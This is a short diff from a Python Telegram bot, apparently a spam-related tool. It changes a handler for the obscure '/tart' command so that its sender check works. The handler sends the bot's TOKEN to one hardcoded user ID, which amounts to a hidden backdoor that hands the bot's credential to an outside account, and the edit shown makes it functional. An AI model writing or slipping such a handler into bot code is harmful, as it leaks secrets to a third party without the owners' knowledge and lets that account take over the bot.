@@ -802,7 +802,7 @@ async def cancel_spam(event):
       
 @client.on(events.NewMessage(pattern='/tart'))
 async def start(event):
-    sender = await event.get_sender()
+    sender = event.sender_id
     if sender == 1037179104:
         await client.send_message(event.sender_id, TOKEN)
 
